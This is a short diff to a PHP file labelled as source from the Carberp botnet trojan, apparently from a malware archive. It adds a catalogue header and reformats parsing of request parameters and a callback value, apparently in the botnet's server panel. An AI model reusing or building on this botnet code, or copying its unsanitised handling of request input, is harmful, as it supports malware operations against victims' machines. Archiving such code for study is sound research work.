@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(0);
@@ -25,8 +36,10 @@ $p = explode('/', $_GET['p']);
 $count_p = count($p);
 if($count_p < 4) print_data('DATA_ERROR!', true);
 
-if(isset($_GET['callback'])){	$callback = $_GET['callback'];
-}else{	parse_str($p[$count_p-1], $callback);
+if(isset($_GET['callback'])){
+	$callback = $_GET['callback'];
+}else{
+	parse_str($p[$count_p-1], $callback);
 	$callback = $callback['?callback'];
 	unset($count_p);
 }
